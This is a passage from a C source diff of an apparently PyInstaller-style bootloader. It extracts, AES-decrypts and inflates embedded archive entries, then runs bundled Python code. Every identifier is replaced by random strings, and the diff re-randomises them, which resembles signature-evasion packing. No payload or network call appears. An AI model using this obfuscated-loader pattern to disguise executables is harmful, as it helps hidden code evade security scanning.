-            mod = PI_PyImport_ExecCodeModule(DqBAqMxmDGRE->name, co);
+int HdPmDvVVxEsKom(ARCHIVE_STATUS *XrgbgyHFUUHCc){
+    PyObject *fScKSAH; PyObject *jWsUaqy; PyObject *JYUaahb;
+    TOC *YwfbnU; PyObject *co; PyObject *mod;
+    fScKSAH = PI_PyImport_ImportModule("marshal");
+    jWsUaqy = PI_PyModule_GetDict(fScKSAH);
+    JYUaahb = PI_PyDict_GetItemString(jWsUaqy, "loads");
+    YwfbnU = XrgbgyHFUUHCc->tocbuff;
+    while (YwfbnU < XrgbgyHFUUHCc->tocend) {
+        if (YwfbnU->typcd == 'm' || YwfbnU->typcd == 'M'){
+            unsigned char *wHwxPKxhKJdmY = SGDbDhuWM(XrgbgyHFUUHCc, YwfbnU);
+            co = PI_PyObject_CallFunction(JYUaahb, "s#", wHwxPKxhKJdmY+8, ntohl(YwfbnU->ulen)-8);
+            mod = PI_PyImport_ExecCodeModule(YwfbnU->name, co);
             if (PI_PyErr_Occurred()) { PI_PyErr_Print(); PI_PyErr_Clear(); }
-            free(HJIkozDUcmgt);
+            free(wHwxPKxhKJdmY);
         }
-        DqBAqMxmDGRE = yjRqNwOEMyUEaOm(fZnnmo, DqBAqMxmDGRE);
+        YwfbnU = axOzXbBy(XrgbgyHFUUHCc, YwfbnU);
     } return 0; }
-int ynIROeBLQAQGMLP(ARCHIVE_STATUS *sqlTiKban, TOC *cEFLJLY){
-    int pjVcdBUDCtw; int NQbBcBYnmfjJ = sqlTiKban->pkgstart + ntohl(cEFLJLY->pos);
-    char *LmHQYN = "sys.path.append(r\"%s?%d\")\n";
-    char *wQkWGxyhw = (char *) malloc(strlen(LmHQYN) + strlen(sqlTiKban->archivename) + 32);
-    sprintf(wQkWGxyhw, LmHQYN, sqlTiKban->archivename, NQbBcBYnmfjJ);
-    pjVcdBUDCtw = PI_PyRun_SimpleString(wQkWGxyhw);
-    if (pjVcdBUDCtw != 0){ free(wQkWGxyhw); return -1; }
-    free(wQkWGxyhw); return 0;}
-int DcBDCvzXzHz(ARCHIVE_STATUS *DAmoKGNBQs){
-TOC * CxIccXdlNg; CxIccXdlNg = DAmoKGNBQs->tocbuff;
-while (CxIccXdlNg < DAmoKGNBQs->tocend) {
-    if (CxIccXdlNg->typcd == 'z') { ynIROeBLQAQGMLP(DAmoKGNBQs, CxIccXdlNg); }
-    CxIccXdlNg = yjRqNwOEMyUEaOm(DAmoKGNBQs, CxIccXdlNg); }
+int ETmLkjcfMikkF(ARCHIVE_STATUS *omiIRJ, TOC *SGqpcWCJUlWZF){
+    int vkhMrBTLyL; int HYANkA = omiIRJ->pkgstart + ntohl(SGqpcWCJUlWZF->pos);
+    char *mqdboGlc = "sys.path.append(r\"%s?%d\")\n";
+    char *ClqIvHrJjb = (char *) malloc(strlen(mqdboGlc) + strlen(omiIRJ->archivename) + 32);
+    sprintf(ClqIvHrJjb, mqdboGlc, omiIRJ->archivename, HYANkA);
+    vkhMrBTLyL = PI_PyRun_SimpleString(ClqIvHrJjb);
+    if (vkhMrBTLyL != 0){ free(ClqIvHrJjb); return -1; }
+    free(ClqIvHrJjb); return 0;}
+int ZoJMtJHFzYkkW(ARCHIVE_STATUS *AhNxvlxRDW){
+TOC * vXyFJyEIM; vXyFJyEIM = AhNxvlxRDW->tocbuff;
+while (vXyFJyEIM < AhNxvlxRDW->tocend) {
+    if (vXyFJyEIM->typcd == 'z') { ETmLkjcfMikkF(AhNxvlxRDW, vXyFJyEIM); }
+    vXyFJyEIM = axOzXbBy(AhNxvlxRDW, vXyFJyEIM); }
 return 0; }
-unsigned char *iDVGdBmBELLPJB(unsigned char * rUqcxb, TOC *EEBcxfu){
-unsigned char *LkJIkFmIjjxJ; z_stream HcXHbQKmB; int EtOYBpVDPkDc;
-LkJIkFmIjjxJ = (unsigned char *)malloc(ntohl(EEBcxfu->ulen));
-if (LkJIkFmIjjxJ == NULL) { return NULL; }
-HcXHbQKmB.zalloc = NULL;
-HcXHbQKmB.zfree = NULL;
-HcXHbQKmB.opaque = NULL;
-HcXHbQKmB.next_in = rUqcxb;
-HcXHbQKmB.avail_in = ntohl(EEBcxfu->len);
-HcXHbQKmB.next_out = LkJIkFmIjjxJ;
-HcXHbQKmB.avail_out = ntohl(EEBcxfu->ulen);
-EtOYBpVDPkDc = inflateInit(&HcXHbQKmB);
-if (EtOYBpVDPkDc >= 0) { 
-    EtOYBpVDPkDc = (inflate)(&HcXHbQKmB, Z_FINISH);
-    if (EtOYBpVDPkDc >= 0) { EtOYBpVDPkDc = (inflateEnd)(&HcXHbQKmB); }
+unsigned char *XFdfZKxlfuHI(unsigned char * bsousSFPOXOq, TOC *tDUBFlYAagyT){
+unsigned char *KFEWSWw; z_stream rjtJAoqdoEGvmCL; int odUagGozPJ;
+KFEWSWw = (unsigned char *)malloc(ntohl(tDUBFlYAagyT->ulen));
+if (KFEWSWw == NULL) { return NULL; }
+rjtJAoqdoEGvmCL.zalloc = NULL;
+rjtJAoqdoEGvmCL.zfree = NULL;
+rjtJAoqdoEGvmCL.opaque = NULL;
+rjtJAoqdoEGvmCL.next_in = bsousSFPOXOq;
+rjtJAoqdoEGvmCL.avail_in = ntohl(tDUBFlYAagyT->len);
+rjtJAoqdoEGvmCL.next_out = KFEWSWw;
+rjtJAoqdoEGvmCL.avail_out = ntohl(tDUBFlYAagyT->ulen);
+odUagGozPJ = inflateInit(&rjtJAoqdoEGvmCL);
+if (odUagGozPJ >= 0) { 
+    odUagGozPJ = (inflate)(&rjtJAoqdoEGvmCL, Z_FINISH);
+    if (odUagGozPJ >= 0) { odUagGozPJ = (inflateEnd)(&rjtJAoqdoEGvmCL); }
     else { return NULL; } }
 else { return NULL; }
-return LkJIkFmIjjxJ;}
-unsigned char *kGcZCaV(ARCHIVE_STATUS *VLuuzYNCQ, TOC *OhmAqjnDtcXP){
-unsigned char *HlebMycsvXSOva;unsigned char *gLugpHp;
-fseek(VLuuzYNCQ->fp, VLuuzYNCQ->pkgstart + ntohl(OhmAqjnDtcXP->pos), SEEK_SET);
-HlebMycsvXSOva = (unsigned char *)malloc(ntohl(OhmAqjnDtcXP->len));
-if (HlebMycsvXSOva == NULL) { return NULL; }
-if (fread(HlebMycsvXSOva, ntohl(OhmAqjnDtcXP->len), 1, VLuuzYNCQ->fp) < 1) { return NULL; }
-if (OhmAqjnDtcXP->cflag == '\2') {
-    static PyObject *jHNvZAomj = NULL;
-    PyObject *jiZczny; PyObject *HSJAGaBFDMqGgN; PyObject *MDWDvCCCzjmUBxk; PyObject *bQqZWmFHVl;
+return KFEWSWw;}
+unsigned char *SGDbDhuWM(ARCHIVE_STATUS *FRuKMIfuSmppd, TOC *XHsBEVaS){
+unsigned char *chucbEYzIhoIPg;unsigned char *sfgBTCcZMmugofO;
+fseek(FRuKMIfuSmppd->fp, FRuKMIfuSmppd->pkgstart + ntohl(XHsBEVaS->pos), SEEK_SET);
+chucbEYzIhoIPg = (unsigned char *)malloc(ntohl(XHsBEVaS->len));
+if (chucbEYzIhoIPg == NULL) { return NULL; }
+if (fread(chucbEYzIhoIPg, ntohl(XHsBEVaS->len), 1, FRuKMIfuSmppd->fp) < 1) { return NULL; }
+if (XHsBEVaS->cflag == '\2') {
+    static PyObject *lVRtysyXJxzSD = NULL;
+    PyObject *QFvOhuwJqA; PyObject *SZxhLdNyHllkOe; PyObject *cPIMXMJxPlHw; PyObject *YCzsyYPMsTd;
     long block_size; char *iv;
-    if (!jHNvZAomj) jHNvZAomj = PI_PyImport_ImportModule("AES");
-    HSJAGaBFDMqGgN = PI_PyModule_GetDict(jHNvZAomj);
-    jiZczny = PI_PyDict_GetItemString(HSJAGaBFDMqGgN, "new");
-    block_size = PI_PyInt_AsLong(PI_PyDict_GetItemString(HSJAGaBFDMqGgN, "block_size"));
+    if (!lVRtysyXJxzSD) lVRtysyXJxzSD = PI_PyImport_ImportModule("AES");
+    SZxhLdNyHllkOe = PI_PyModule_GetDict(lVRtysyXJxzSD);
+    QFvOhuwJqA = PI_PyDict_GetItemString(SZxhLdNyHllkOe, "new");
+    block_size = PI_PyInt_AsLong(PI_PyDict_GetItemString(SZxhLdNyHllkOe, "block_size"));
     iv = malloc(block_size);
     memset(iv, 0, block_size);
-    MDWDvCCCzjmUBxk = PI_PyObject_CallFunction(jiZczny, "s#Os#", HlebMycsvXSOva, 32, PI_PyDict_GetItemString(HSJAGaBFDMqGgN, "MODE_CFB"), iv, block_size);
-    bQqZWmFHVl = PI_PyObject_CallMethod(MDWDvCCCzjmUBxk, "decrypt", "s#", HlebMycsvXSOva+32, ntohl(OhmAqjnDtcXP->len)-32);
-    memcpy(HlebMycsvXSOva, PI_PyString_AsString(bQqZWmFHVl), ntohl(OhmAqjnDtcXP->len)-32);
-    Py_DECREF(MDWDvCCCzjmUBxk); Py_DECREF(bQqZWmFHVl);}
-if (OhmAqjnDtcXP->cflag == '\1' || OhmAqjnDtcXP->cflag == '\2') {
-    gLugpHp = iDVGdBmBELLPJB(HlebMycsvXSOva, OhmAqjnDtcXP);
-    free(HlebMycsvXSOva); HlebMycsvXSOva = gLugpHp;
-    if (HlebMycsvXSOva == NULL) { return NULL; } }
-return HlebMycsvXSOva;}
-FILE *evWbNY(const char *EneVRDSyB, const char* FEFhDTqR) {
-struct stat zMGGmemMPkyrtsK; char dTyJbpVv[_MAX_PATH+1]; char TtiGMCFGaBNG[_MAX_PATH+1]; char *jSKuqSH;
-strcpy(dTyJbpVv, EneVRDSyB); strcpy(TtiGMCFGaBNG, FEFhDTqR); dTyJbpVv[strlen(dTyJbpVv)-1] = '\0';
-jSKuqSH = strtok(TtiGMCFGaBNG, "/\\");
-while (jSKuqSH != NULL){
-    strcat(dTyJbpVv, "\\");
-    strcat(dTyJbpVv, jSKuqSH);
-    jSKuqSH = strtok(NULL, "/\\");
-    if (!jSKuqSH) break;
-    if (stat(dTyJbpVv, &zMGGmemMPkyrtsK) < 0) {mkdir(dTyJbpVv);} }
-return fopen(dTyJbpVv, "wb"); }
-static int hQyfGDYUvPIYgwv(ARCHIVE_STATUS *clMEqdsjWGDkn) {
-char *KmXRRgq;
-if (clMEqdsjWGDkn->temppath[0] == '\0') {
-    if (!oohRaJfZL(clMEqdsjWGDkn->temppath)) {return -1;}
-    strcpy(clMEqdsjWGDkn->temppathraw, clMEqdsjWGDkn->temppath);
-    for ( KmXRRgq=clMEqdsjWGDkn->temppath; *KmXRRgq; KmXRRgq++ ) if (*KmXRRgq == '\\') *KmXRRgq = '/';}
+    cPIMXMJxPlHw = PI_PyObject_CallFunction(QFvOhuwJqA, "s#Os#", chucbEYzIhoIPg, 32, PI_PyDict_GetItemString(SZxhLdNyHllkOe, "MODE_CFB"), iv, block_size);
+    YCzsyYPMsTd = PI_PyObject_CallMethod(cPIMXMJxPlHw, "decrypt", "s#", chucbEYzIhoIPg+32, ntohl(XHsBEVaS->len)-32);
+    memcpy(chucbEYzIhoIPg, PI_PyString_AsString(YCzsyYPMsTd), ntohl(XHsBEVaS->len)-32);
+    Py_DECREF(cPIMXMJxPlHw); Py_DECREF(YCzsyYPMsTd);}
+if (XHsBEVaS->cflag == '\1' || XHsBEVaS->cflag == '\2') {
+    sfgBTCcZMmugofO = XFdfZKxlfuHI(chucbEYzIhoIPg, XHsBEVaS);
+    free(chucbEYzIhoIPg); chucbEYzIhoIPg = sfgBTCcZMmugofO;
+    if (chucbEYzIhoIPg == NULL) { return NULL; } }
+return chucbEYzIhoIPg;}
+FILE *dlEbKwerZsqm(const char *lZkDJgF, const char* RkOBnNTbtysktUQ) {
+struct stat WiXbNFKtfnFPy; char uodUctqNQgf[_MAX_PATH+1]; char qIjHKXmZrDOlHmk[_MAX_PATH+1]; char *pxZpLEHz;
+strcpy(uodUctqNQgf, lZkDJgF); strcpy(qIjHKXmZrDOlHmk, RkOBnNTbtysktUQ); uodUctqNQgf[strlen(uodUctqNQgf)-1] = '\0';
+pxZpLEHz = strtok(qIjHKXmZrDOlHmk, "/\\");
+while (pxZpLEHz != NULL){
+    strcat(uodUctqNQgf, "\\");
+    strcat(uodUctqNQgf, pxZpLEHz);
+    pxZpLEHz = strtok(NULL, "/\\");
+    if (!pxZpLEHz) break;
+    if (stat(uodUctqNQgf, &WiXbNFKtfnFPy) < 0) {mkdir(uodUctqNQgf);} }
+return fopen(uodUctqNQgf, "wb"); }
+static int GrdozDndT(ARCHIVE_STATUS *ffzpUrHrBuvjxfz) {
+char *ESUzQxxQaCXeWru;
+if (ffzpUrHrBuvjxfz->temppath[0] == '\0') {
+    if (!mGkitJhHLvi(ffzpUrHrBuvjxfz->temppath)) {return -1;}
+    strcpy(ffzpUrHrBuvjxfz->temppathraw, ffzpUrHrBuvjxfz->temppath);
+    for ( ESUzQxxQaCXeWru=ffzpUrHrBuvjxfz->temppath; *ESUzQxxQaCXeWru; ESUzQxxQaCXeWru++ ) if (*ESUzQxxQaCXeWru == '\\') *ESUzQxxQaCXeWru = '/';}
 return 0;}
-int uuPLZndK(ARCHIVE_STATUS *HIGfIYdGTCR, TOC *vcxxoqQBQJ) {
-FILE *IbZwUmyYE; unsigned char *YgMZtFlopxnu = kGcZCaV(HIGfIYdGTCR, vcxxoqQBQJ);
-if (hQyfGDYUvPIYgwv(HIGfIYdGTCR) == -1){ return -1; }
-IbZwUmyYE = evWbNY(HIGfIYdGTCR->temppath, vcxxoqQBQJ->name);
-if (IbZwUmyYE == NULL)  { return -1; }
-else { fwrite(YgMZtFlopxnu, ntohl(vcxxoqQBQJ->ulen), 1, IbZwUmyYE); fclose(IbZwUmyYE); }
-free(YgMZtFlopxnu); return 0; }
-static int APmZGDJDb(char *PssUOMiVJbvyh, char *TUbXvnZoGPilwG, const char *FxrNQQuQ) {
-char nhGqQlYguValIJ[_MAX_PATH + 1];
-strcpy(nhGqQlYguValIJ, FxrNQQuQ);
-strcpy(PssUOMiVJbvyh, strtok(nhGqQlYguValIJ, ":"));
-strcpy(TUbXvnZoGPilwG, strtok(NULL, ":")) ;
-if (PssUOMiVJbvyh[0] == 0 || TUbXvnZoGPilwG[0] == 0) return -1;
+int BFTiQVRX(ARCHIVE_STATUS *GOZcFeomWakOlGQ, TOC *RCrBMoMWuC) {
+FILE *bDcHQaXSeJw; unsigned char *VMuYNGNf = SGDbDhuWM(GOZcFeomWakOlGQ, RCrBMoMWuC);
+if (GrdozDndT(GOZcFeomWakOlGQ) == -1){ return -1; }
+bDcHQaXSeJw = dlEbKwerZsqm(GOZcFeomWakOlGQ->temppath, RCrBMoMWuC->name);
+if (bDcHQaXSeJw == NULL)  { return -1; }
+else { fwrite(VMuYNGNf, ntohl(RCrBMoMWuC->ulen), 1, bDcHQaXSeJw); fclose(bDcHQaXSeJw); }
+free(VMuYNGNf); return 0; }
+static int wePBEXKtzB(char *XSuVHrWv, char *BUaISG, const char *czSgELSs) {
+char RhBezsC[_MAX_PATH + 1];
+strcpy(RhBezsC, czSgELSs);
+strcpy(XSuVHrWv, strtok(RhBezsC, ":"));
+strcpy(BUaISG, strtok(NULL, ":")) ;
+if (XSuVHrWv[0] == 0 || BUaISG[0] == 0) return -1;
 return 0; }
-static int nTARxGhkAwXBCG(const char *jxqGuRtrapQGaXv, const char *gRzokMy, const char *CVBKlSYbtes) {
-FILE *itGrTsav = fopen(jxqGuRtrapQGaXv, "rb"); FILE *AnsBMW = evWbNY(gRzokMy, CVBKlSYbtes);
+static int BecGJpAct(const char *AJiDgIqMTRJVSa, const char *lFHrAPnGGmN, const char *UZTVZgOBW) {
+FILE *HBycWv = fopen(AJiDgIqMTRJVSa, "rb"); FILE *LUtTFGUnWOtVOLT = dlEbKwerZsqm(lFHrAPnGGmN, UZTVZgOBW);
 char buf[4096]; int error = 0;
-if (itGrTsav == NULL || AnsBMW == NULL) return -1;
-while (!feof(itGrTsav)) {
-    if (fread(buf, 4096, 1, itGrTsav) == -1) {
-        if (ferror(itGrTsav)) { clearerr(itGrTsav); error = -1; break; }
+if (HBycWv == NULL || LUtTFGUnWOtVOLT == NULL) return -1;
+while (!feof(HBycWv)) {
+    if (fread(buf, 4096, 1, HBycWv) == -1) {
+        if (ferror(HBycWv)) { clearerr(HBycWv); error = -1; break; }
     } else {
-        fwrite(buf, 4096, 1, AnsBMW);
-        if (ferror(AnsBMW)) { clearerr(AnsBMW); error = -1; break;}}}
-fclose(itGrTsav); fclose(AnsBMW); return error; }
-static char *OATByY(const char *FItBHgIriyBvwQ) {
-char *lwHadDkAN = strrchr(FItBHgIriyBvwQ, '\\');
-char *dkTfkFvZtLNGlz = (char *) calloc(_MAX_PATH, sizeof(char));
-if (lwHadDkAN != NULL) strncpy(dkTfkFvZtLNGlz, FItBHgIriyBvwQ, lwHadDkAN - FItBHgIriyBvwQ + 1);
-else strcpy(dkTfkFvZtLNGlz, FItBHgIriyBvwQ);
-return dkTfkFvZtLNGlz; }
-static int OGtBFLsqwWcr(ARCHIVE_STATUS *eKeEitH, const char *yXBlgpc, const char *csEFKIFYnhRnOJn){
-if (hQyfGDYUvPIYgwv(eKeEitH) == -1){ return -1; }
-if (nTARxGhkAwXBCG(yXBlgpc, eKeEitH->temppath, csEFKIFYnhRnOJn) == -1) { return -1; }
+        fwrite(buf, 4096, 1, LUtTFGUnWOtVOLT);
+        if (ferror(LUtTFGUnWOtVOLT)) { clearerr(LUtTFGUnWOtVOLT); error = -1; break;}}}
+fclose(HBycWv); fclose(LUtTFGUnWOtVOLT); return error; }
+static char *iqZarPpgKmgDk(const char *wjBzIBtbba) {
+char *tEugkDFGcdgG = strrchr(wjBzIBtbba, '\\');
+char *NNvlqtvZur = (char *) calloc(_MAX_PATH, sizeof(char));
+if (tEugkDFGcdgG != NULL) strncpy(NNvlqtvZur, wjBzIBtbba, tEugkDFGcdgG - wjBzIBtbba + 1);
+else strcpy(NNvlqtvZur, wjBzIBtbba);
+return NNvlqtvZur; }
+static int WYjYnVnlQSBivX(ARCHIVE_STATUS *PtVdhlYXV, const char *CjfxMjPuczV, const char *ldyUvO){
+if (GrdozDndT(PtVdhlYXV) == -1){ return -1; }
+if (BecGJpAct(CjfxMjPuczV, PtVdhlYXV->temppath, ldyUvO) == -1) { return -1; }
 return 0; }
-static ARCHIVE_STATUS *EFFAtzdggB(ARCHIVE_STATUS *OmGmwxEJbko[], const char *axhDCVIEld) {
-ARCHIVE_STATUS *oLhzRo = NULL; int i = 0;
-if (hQyfGDYUvPIYgwv(OmGmwxEJbko[SELF]) == -1){ return NULL; } 
-for (i = 1; OmGmwxEJbko[i] != NULL; i++){ if (strcmp(OmGmwxEJbko[i]->archivename, axhDCVIEld) == 0) { return OmGmwxEJbko[i]; } }
-if ((oLhzRo = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL) { return NULL; }
-strcpy(oLhzRo->archivename, axhDCVIEld);
-strcpy(oLhzRo->homepath, OmGmwxEJbko[SELF]->homepath);
-strcpy(oLhzRo->temppath, OmGmwxEJbko[SELF]->temppath);
-strcpy(oLhzRo->homepathraw, OmGmwxEJbko[SELF]->homepathraw);
-strcpy(oLhzRo->temppathraw, OmGmwxEJbko[SELF]->temppathraw);
-if (ySQXyhSAKp(oLhzRo)) { free(oLhzRo); return NULL; }
-OmGmwxEJbko[i] = oLhzRo; return oLhzRo; }
-static int fchfvpU(ARCHIVE_STATUS *uNDlXw, const char *YmhZEyemfzMfi) {
-TOC * SWsaJwXmgefTkF = uNDlXw->tocbuff;
-while (SWsaJwXmgefTkF < uNDlXw->tocend) {
-    if (strcmp(SWsaJwXmgefTkF->name, YmhZEyemfzMfi) == 0) if (uuPLZndK(uNDlXw, SWsaJwXmgefTkF)) return -1;
-    SWsaJwXmgefTkF = yjRqNwOEMyUEaOm(uNDlXw, SWsaJwXmgefTkF); }
+static ARCHIVE_STATUS *sCRqeV(ARCHIVE_STATUS *TUNDrNzIknH[], const char *cjYfiIw) {
+ARCHIVE_STATUS *HTZktn = NULL; int i = 0;
+if (GrdozDndT(TUNDrNzIknH[SELF]) == -1){ return NULL; } 
+for (i = 1; TUNDrNzIknH[i] != NULL; i++){ if (strcmp(TUNDrNzIknH[i]->archivename, cjYfiIw) == 0) { return TUNDrNzIknH[i]; } }
+if ((HTZktn = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL) { return NULL; }
+strcpy(HTZktn->archivename, cjYfiIw);
+strcpy(HTZktn->homepath, TUNDrNzIknH[SELF]->homepath);
+strcpy(HTZktn->temppath, TUNDrNzIknH[SELF]->temppath);
+strcpy(HTZktn->homepathraw, TUNDrNzIknH[SELF]->homepathraw);
+strcpy(HTZktn->temppathraw, TUNDrNzIknH[SELF]->temppathraw);
+if (ndqRJbtnndS(HTZktn)) { free(HTZktn); return NULL; }
+TUNDrNzIknH[i] = HTZktn; return HTZktn; }
+static int bsqnqWZQSxYn(ARCHIVE_STATUS *tZmZlBtcIiEI, const char *JJifMBRI) {
+TOC * QthyfuDvTXebdVs = tZmZlBtcIiEI->tocbuff;
+while (QthyfuDvTXebdVs < tZmZlBtcIiEI->tocend) {
+    if (strcmp(QthyfuDvTXebdVs->name, JJifMBRI) == 0) if (BFTiQVRX(tZmZlBtcIiEI, QthyfuDvTXebdVs)) return -1;
+    QthyfuDvTXebdVs = axOzXbBy(tZmZlBtcIiEI, QthyfuDvTXebdVs); }
 return 0; }
-static int KheRbZcaK(ARCHIVE_STATUS *TGsBxMlerFCT[], const char *bZalqGiJxxNY) {
-ARCHIVE_STATUS *APmuAJHK = NULL;
-char zFtPqkpEbLzLIcB[_MAX_PATH + 1]; char LsvWmfpUxW[_MAX_PATH + 1];
-char zyiGUhfPWSHA[_MAX_PATH + 1]; char *YaeeVoA = NULL;
-if (APmZGDJDb(zFtPqkpEbLzLIcB, LsvWmfpUxW, bZalqGiJxxNY) == -1) return -1;
-YaeeVoA = OATByY(zFtPqkpEbLzLIcB);
-if (YaeeVoA[0] == 0) { free(YaeeVoA); return -1; }
-if ((gIWgCfgOzOQKFS(zyiGUhfPWSHA, "%s%s.pkg", TGsBxMlerFCT[SELF]->homepath, zFtPqkpEbLzLIcB) != 0) &&
-    (gIWgCfgOzOQKFS(zyiGUhfPWSHA, "%s%s.exe", TGsBxMlerFCT[SELF]->homepath, zFtPqkpEbLzLIcB) != 0) &&
-    (gIWgCfgOzOQKFS(zyiGUhfPWSHA, "%s%s", TGsBxMlerFCT[SELF]->homepath, zFtPqkpEbLzLIcB) != 0)) { return -1; }
-    if ((APmuAJHK = EFFAtzdggB(TGsBxMlerFCT, zyiGUhfPWSHA)) == NULL) { return -1; }
-if (fchfvpU(APmuAJHK, LsvWmfpUxW) == -1) { free(APmuAJHK); return -1; }
-free(YaeeVoA); return 0; }
-int CxMFOmAYcNx(ARCHIVE_STATUS *MgpxSlfkv[]) {
-TOC * eFJOJkEpFpDMUz = MgpxSlfkv[SELF]->tocbuff;
-while (eFJOJkEpFpDMUz < MgpxSlfkv[SELF]->tocend) {
-    if (eFJOJkEpFpDMUz->typcd == 'b' || eFJOJkEpFpDMUz->typcd == 'x' || eFJOJkEpFpDMUz->typcd == 'Z') return 1;
-    if (eFJOJkEpFpDMUz->typcd == 'd')  return 1;
-    eFJOJkEpFpDMUz = yjRqNwOEMyUEaOm(MgpxSlfkv[SELF], eFJOJkEpFpDMUz);
+static int snCjwlryH(ARCHIVE_STATUS *PnnBeRVcLkEjxk[], const char *FfFSYjbaokOmWwy) {
+ARCHIVE_STATUS *osckuRiaHS = NULL;
+char TaTCaQvLG[_MAX_PATH + 1]; char xyeKapy[_MAX_PATH + 1];
+char IYdTbUzfWy[_MAX_PATH + 1]; char *mWoIFwAJZQDsItm = NULL;
+if (wePBEXKtzB(TaTCaQvLG, xyeKapy, FfFSYjbaokOmWwy) == -1) return -1;
+mWoIFwAJZQDsItm = iqZarPpgKmgDk(TaTCaQvLG);
+if (mWoIFwAJZQDsItm[0] == 0) { free(mWoIFwAJZQDsItm); return -1; }
+if ((alLElzOpqOZA(IYdTbUzfWy, "%s%s.pkg", PnnBeRVcLkEjxk[SELF]->homepath, TaTCaQvLG) != 0) &&
+    (alLElzOpqOZA(IYdTbUzfWy, "%s%s.exe", PnnBeRVcLkEjxk[SELF]->homepath, TaTCaQvLG) != 0) &&
+    (alLElzOpqOZA(IYdTbUzfWy, "%s%s", PnnBeRVcLkEjxk[SELF]->homepath, TaTCaQvLG) != 0)) { return -1; }
+    if ((osckuRiaHS = sCRqeV(PnnBeRVcLkEjxk, IYdTbUzfWy)) == NULL) { return -1; }
+if (bsqnqWZQSxYn(osckuRiaHS, xyeKapy) == -1) { free(osckuRiaHS); return -1; }
+free(mWoIFwAJZQDsItm); return 0; }
+int vRQebKCCRrnDGe(ARCHIVE_STATUS *JbWPtHzrtajO[]) {
+TOC * OQQvYCSDtawGFwq = JbWPtHzrtajO[SELF]->tocbuff;
+while (OQQvYCSDtawGFwq < JbWPtHzrtajO[SELF]->tocend) {
+    if (OQQvYCSDtawGFwq->typcd == 'b' || OQQvYCSDtawGFwq->typcd == 'x' || OQQvYCSDtawGFwq->typcd == 'Z') return 1;
+    if (OQQvYCSDtawGFwq->typcd == 'd')  return 1;
+    OQQvYCSDtawGFwq = axOzXbBy(JbWPtHzrtajO[SELF], OQQvYCSDtawGFwq);
 } return 0; }
-int WcDOapvnLPszOZh(ARCHIVE_STATUS *eVwGdtvZbJprshx[]) {
-TOC * nOFAmdgMx = eVwGdtvZbJprshx[SELF]->tocbuff;
-while (nOFAmdgMx < eVwGdtvZbJprshx[SELF]->tocend) {
-    if (nOFAmdgMx->typcd == 'b' || nOFAmdgMx->typcd == 'x' || nOFAmdgMx->typcd == 'Z')
-        if (uuPLZndK(eVwGdtvZbJprshx[SELF], nOFAmdgMx)) return -1;
-    if (nOFAmdgMx->typcd == 'd') {
-        if (KheRbZcaK(eVwGdtvZbJprshx, nOFAmdgMx->name) == -1) return -1; }
-    nOFAmdgMx = yjRqNwOEMyUEaOm(eVwGdtvZbJprshx[SELF], nOFAmdgMx); }
+int pbtRZQU(ARCHIVE_STATUS *QkWxBKUO[]) {
+TOC * dJTuBOaBRyD = QkWxBKUO[SELF]->tocbuff;
+while (dJTuBOaBRyD < QkWxBKUO[SELF]->tocend) {
+    if (dJTuBOaBRyD->typcd == 'b' || dJTuBOaBRyD->typcd == 'x' || dJTuBOaBRyD->typcd == 'Z')
+        if (BFTiQVRX(QkWxBKUO[SELF], dJTuBOaBRyD)) return -1;
+    if (dJTuBOaBRyD->typcd == 'd') {
+        if (snCjwlryH(QkWxBKUO, dJTuBOaBRyD->name) == -1) return -1; }
+    dJTuBOaBRyD = axOzXbBy(QkWxBKUO[SELF], dJTuBOaBRyD); }
 return 0; }
-int hfPKSje(ARCHIVE_STATUS *rNVnTYOumiE) {
-unsigned char *IwdrsUiWgfW; char NcWHYsjKwALwUK[_MAX_PATH]; int ehkxHGlRi = 0;
-TOC * dxlrzXsKaSgnuCP = rNVnTYOumiE->tocbuff;
+int HZWOOvAo(ARCHIVE_STATUS *ESjaOJotIdyhqcx) {
+unsigned char *QVNvhMkyEqFKEx; char zYyYuPGe[_MAX_PATH]; int NCZgtFOfxQRThE = 0;
+TOC * tasgrOigVgr = ESjaOJotIdyhqcx->tocbuff;
 PyObject *__main__ = PI_PyImport_AddModule("__main__"); PyObject *__file__;
-while (dxlrzXsKaSgnuCP < rNVnTYOumiE->tocend) {
-    if (dxlrzXsKaSgnuCP->typcd == 's') {
-        IwdrsUiWgfW = kGcZCaV(rNVnTYOumiE, dxlrzXsKaSgnuCP);
-        strcpy(NcWHYsjKwALwUK, dxlrzXsKaSgnuCP->name); strcat(NcWHYsjKwALwUK, ".py");
-        __file__ = PI_PyString_FromStringAndSize(NcWHYsjKwALwUK, strlen(NcWHYsjKwALwUK));
+while (tasgrOigVgr < ESjaOJotIdyhqcx->tocend) {
+    if (tasgrOigVgr->typcd == 's') {
+        QVNvhMkyEqFKEx = SGDbDhuWM(ESjaOJotIdyhqcx, tasgrOigVgr);
+        strcpy(zYyYuPGe, tasgrOigVgr->name); strcat(zYyYuPGe, ".py");
+        __file__ = PI_PyString_FromStringAndSize(zYyYuPGe, strlen(zYyYuPGe));
         PI_PyObject_SetAttrString(__main__, "__file__", __file__); Py_DECREF(__file__);
-        ehkxHGlRi = PI_PyRun_SimpleString(IwdrsUiWgfW);
-        if (ehkxHGlRi != 0) return ehkxHGlRi; free(IwdrsUiWgfW); }
-    dxlrzXsKaSgnuCP = yjRqNwOEMyUEaOm(rNVnTYOumiE, dxlrzXsKaSgnuCP);
+        NCZgtFOfxQRThE = PI_PyRun_SimpleString(QVNvhMkyEqFKEx);
+        if (NCZgtFOfxQRThE != 0) return NCZgtFOfxQRThE; free(QVNvhMkyEqFKEx); }
+    tasgrOigVgr = axOzXbBy(ESjaOJotIdyhqcx, tasgrOigVgr);
 } return 0; }
-int dRPpamEhMrcHR(ARCHIVE_STATUS *LuYomFptTdO, char const * UumUUIg, char  const * vUbFLoJzOJ) {
-if (TsFCEChzdbpj(LuYomFptTdO, UumUUIg, vUbFLoJzOJ)) return -1;
-if (ySQXyhSAKp(LuYomFptTdO)) return -1;
+int VoIWYKYKccMMTqo(ARCHIVE_STATUS *LylcvQoyFkgUi, char const * ZZPgmbV, char  const * OUGfLskLvdQJgF) {
+if (rDvZnGjxrftwm(LylcvQoyFkgUi, ZZPgmbV, OUGfLskLvdQJgF)) return -1;
+if (ndqRJbtnndS(LylcvQoyFkgUi)) return -1;
 return 0; }
-int Eezpizy(ARCHIVE_STATUS *hjmTBMu, int argc, char *argv[]) {
-int VQiKEQBn = 0;
-if (kvQzAxpTw(hjmTBMu)) return -1;
